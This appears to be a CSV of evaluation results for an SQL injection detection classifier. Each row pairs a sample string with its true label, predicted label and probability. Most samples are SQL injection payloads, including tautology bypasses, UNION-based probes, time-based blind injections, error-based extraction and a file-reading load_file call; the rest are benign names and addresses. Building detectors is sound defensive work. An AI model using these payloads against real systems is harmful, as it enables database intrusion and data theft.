text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"c/ ancha, 31 5a",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36579,0,0,4.597321094479412e-05,1
wayca,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36588,0,0,4.603445631801151e-05,1
58843682e,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36599,0,0,7.232742063933983e-05,1
2226226735734653,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36610,0,0,9.748421871336177e-05,1
avantrn,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36622,0,0,4.206951416563243e-05,1
4res-cr7pc4n,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36632,0,0,0.00010294836829416454,1
singla goicoechea,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36646,0,0,3.6876012018183246e-05,1
urgel,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36655,0,0,4.281070505385287e-05,1
d0n0a1o8,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36657,0,0,0.00013044686056673527,1
thala,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36668,0,0,5.1472339691827074e-05,1
erfani,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36678,0,0,4.010945121990517e-05,1
tolosa fontanet,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,36689,0,0,3.855275281239301e-05,1
"select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",sajid576/sql-injection-dataset,36702,1,1,0.9999854564666748,1
"select * from users where id  =  1 or "",."" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
select * from users where id  =  1. <@ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
select * from users where id  =  1.<@. or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999853372573853,1
select * from users where id  =  '1'   or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
"select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999858140945435,1
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',sajid576/sql-injection-dataset,5,1,1,0.9999860525131226,1
"select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.999985933303833,1
"select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999854564666748,1
a' or 1  =  1; --,sajid576/sql-injection-dataset,36712,1,1,0.9999856948852539,1
"select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",sajid576/sql-injection-dataset,3,1,1,0.9999861717224121,1
"select * from users where id  =  1 or "";.""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or "".#"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"benchmark  (  10000000,MD5  (  1   )    )   #",sajid576/sql-injection-dataset,50,1,1,0.9999855756759644,1
sqlattempt1,sajid576/sql-injection-dataset,20684,1,0,0.001752727897837758,0
1' or '1'  =  '1,sajid576/sql-injection-dataset,20659,1,1,0.9999858140945435,1
"select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"select * from users where id  =  1 or "",?"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,5,1,1,0.9999852180480957,1
select * from users where id  =  1 <@1$ or 1  =  1 -- 1,sajid576/sql-injection-dataset,5,1,1,0.9999856948852539,1
"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",sajid576/sql-injection-dataset,36723,1,1,0.9999865293502808,1
"-9656"" union all select 8735,8735--",sajid576/sql-injection-dataset,36736,1,1,0.9999856948852539,1
"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sajid576/sql-injection-dataset,36746,1,1,0.9999866485595703,1
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'scye' like 'scye",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv",sajid576/sql-injection-dataset,36758,1,1,0.9999865293502808,1
-7758%'   )    )     )   or 3038  =  3038,sajid576/sql-injection-dataset,36759,1,1,0.9999864101409912,1
"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",sajid576/sql-injection-dataset,36774,1,1,0.9999865293502808,1
"-5132%""   )    )    or 3038  =  3038",sajid576/sql-injection-dataset,36785,1,1,0.9999862909317017,1
"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
"1%""   )    )    and 2006  =  2006",sajid576/sql-injection-dataset,598,1,1,0.9999862909317017,1
"-1263""  )   or 9323  =  9323#",sajid576/sql-injection-dataset,36796,1,1,0.9999862909317017,1
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'jicq' like 'jicq",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,36809,1,1,0.9999865293502808,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",sajid576/sql-injection-dataset,379,1,1,0.9999864101409912,1
"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,sajid576/sql-injection-dataset,36818,1,1,0.9999864101409912,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,3148,1,1,0.9999864101409912,1
"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,36820,1,1,0.9999865293502808,1
1'  )   as bscn where 6907  =  6907,sajid576/sql-injection-dataset,36830,1,1,0.9999864101409912,1
"1'+  (  select ocvc where 6981  =  6981 union all select null,null,null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,36841,1,1,0.9999861717224121,1
1'+  (  select aqhj where 4419  =  4419,sajid576/sql-injection-dataset,36853,1,1,0.9999861717224121,1
"-2009%' union all select 1991,1991#",sajid576/sql-injection-dataset,36866,1,1,0.9999855756759644,1
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
"1%""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
1 where 8180  =  8180 or sleep  (  5  )  #,sajid576/sql-injection-dataset,36882,1,1,0.9999865293502808,1
-2625'   )    )    or 3038  =  3038,sajid576/sql-injection-dataset,36891,1,1,0.9999861717224121,1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",sajid576/sql-injection-dataset,36892,1,1,0.9999862909317017,1
-3578'   )    )     )   order by 1--,sajid576/sql-injection-dataset,36904,1,1,0.9999858140945435,1
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,sajid576/sql-injection-dataset,36914,1,1,0.9999865293502808,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",sajid576/sql-injection-dataset,36926,1,1,0.9999864101409912,1
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dqis""  =  ""dqis",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
1'||  (  select 'lzzr' where 2477  =  2477,sajid576/sql-injection-dataset,36937,1,1,0.9999862909317017,1
"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",sajid576/sql-injection-dataset,36950,1,1,0.9999864101409912,1
-9700'  )   or 8811  =  7862,sajid576/sql-injection-dataset,36955,1,1,0.9999860525131226,1
"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv",sajid576/sql-injection-dataset,36964,1,1,0.9999865293502808,1
1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,sajid576/sql-injection-dataset,36978,1,1,0.9999864101409912,1
"-4176'+  (  select 'muio' where 4256  =  4256 union all select 4256,4256,4256,4256,4256,4256#",sajid576/sql-injection-dataset,36992,1,1,0.9999865293502808,1
1'  )   where 5307  =  5307,sajid576/sql-injection-dataset,36999,1,1,0.9999864101409912,1
"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,37006,1,1,0.9999862909317017,1
1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
"1'   )    )    and make_set  (  1002  =  3556,3556  )   and    (    (   'mfao'  =  'mfao",sajid576/sql-injection-dataset,37020,1,1,0.9999864101409912,1
1'||  (  select 'ywjy' where 7579  =  7579,sajid576/sql-injection-dataset,37026,1,1,0.9999860525131226,1
"-7551 or elt  (  6900  =  7195,7195  )",sajid576/sql-injection-dataset,37043,1,1,0.9999861717224121,1
"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",sajid576/sql-injection-dataset,37046,1,1,0.9999865293502808,1
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ),sajid576/sql-injection-dataset,544,1,1,0.9999862909317017,1
"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,37056,1,1,0.9999865293502808,1
"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
end and    (    (   'zeyr'  =  'zeyr,sajid576/sql-injection-dataset,37067,1,1,0.9999862909317017,1
"-4915' union all select 1928,1928,1928,1928#",sajid576/sql-injection-dataset,37079,1,1,0.9999860525131226,1
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,sajid576/sql-injection-dataset,37091,1,1,0.9999861717224121,1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sajid576/sql-injection-dataset,812,1,1,0.9999866485595703,1
"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,sajid576/sql-injection-dataset,37100,1,1,0.9999866485595703,1
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",sajid576/sql-injection-dataset,37110,1,1,0.9999861717224121,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""vqpx"" like ""vqpx",sajid576/sql-injection-dataset,37114,1,1,0.9999858140945435,1
1 rlike   (  select   (  case when   (  8911  =  5301  )   then 1 else 0x28 end   )    )   # pmuh,sajid576/sql-injection-dataset,37131,1,1,0.9999864101409912,1
select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,37145,1,1,0.9999864101409912,1
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",sajid576/sql-injection-dataset,37148,1,1,0.9999862909317017,1
1'   )    )     ),sajid576/sql-injection-dataset,37154,1,1,0.9999858140945435,1
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
"-2790%""  )   union all select 5070,5070#",sajid576/sql-injection-dataset,37170,1,1,0.9999864101409912,1
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'rdpv'  =  'rdpv",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--,sajid576/sql-injection-dataset,37185,1,1,0.9999865293502808,1
1' and 2908  =  8067--,sajid576/sql-injection-dataset,37195,1,1,0.9999861717224121,1
"1  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
"1""  )   where 2312  =  2312 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
if  (  6767  =  5022  )   select 6767 else drop function buii--,sajid576/sql-injection-dataset,37205,1,1,0.9999861717224121,1
"1%""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
"1'+  (  select qymy where 8657  =  8657 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,37215,1,1,0.9999861717224121,1
"1"" where 2235  =  2235 union all select null,null,null,null,null--",sajid576/sql-injection-dataset,37223,1,1,0.9999862909317017,1
1'   )    )    as jbcd where 9078  =  9078 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,37226,1,1,0.9999866485595703,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,sajid576/sql-injection-dataset,2038,1,1,0.9999862909317017,1
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
-5113'   )    )     )   or 7200  =  3094--,sajid576/sql-injection-dataset,37236,1,1,0.9999861717224121,1
"-5211""   )    )    as bkvr where 4082  =  4082 or 2323  =  8052",sajid576/sql-injection-dataset,37247,1,1,0.9999864101409912,1
"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",sajid576/sql-injection-dataset,379,1,1,0.9999864101409912,1
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",sajid576/sql-injection-dataset,37258,1,1,0.9999854564666748,1
"1"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",sajid576/sql-injection-dataset,37271,1,1,0.9999866485595703,1
"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",sajid576/sql-injection-dataset,37283,1,1,0.9999865293502808,1
"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",sajid576/sql-injection-dataset,37295,1,1,0.9999864101409912,1
"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sajid576/sql-injection-dataset,37302,1,1,0.9999865293502808,1
"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )",sajid576/sql-injection-dataset,1681,1,1,0.9999864101409912,1
"1"" where 4319  =  4319",sajid576/sql-injection-dataset,37308,1,1,0.9999862909317017,1
"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",sajid576/sql-injection-dataset,37322,1,1,0.9999865293502808,1
"1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
5240,sajid576/sql-injection-dataset,37331,0,0,5.8654211898101494e-05,1
darrieu@redstarz.sv,sajid576/sql-injection-dataset,37344,0,0,3.482851025182754e-05,1
f8av2,sajid576/sql-injection-dataset,37354,0,0,4.111665111850016e-05,1
45370,sajid576/sql-injection-dataset,37364,0,0,4.4471544242696837e-05,1
90660924f,sajid576/sql-injection-dataset,37377,0,0,6.13770098425448e-05,1
25330,sajid576/sql-injection-dataset,37386,0,0,4.218766844132915e-05,1
"c/ pozo seco 37, 6-d",sajid576/sql-injection-dataset,37397,0,0,4.5503751607611775e-05,1
c/ san antonio 65 12?a,sajid576/sql-injection-dataset,37405,0,0,3.914424087270163e-05,1
tejeda,sajid576/sql-injection-dataset,37408,0,0,4.246124080964364e-05,1
86953454e,sajid576/sql-injection-dataset,37417,0,0,4.496648762142286e-05,1
"calle sant joan, 123,",sajid576/sql-injection-dataset,37430,0,0,4.161110337008722e-05,1
8322,sajid576/sql-injection-dataset,37442,0,0,4.808677840628661e-05,1
renan1@fichajes.nom.sd,sajid576/sql-injection-dataset,37456,0,0,4.2552564991638064e-05,1
9.17344E+15,sajid576/sql-injection-dataset,37467,0,0,0.00016119898646138608,1
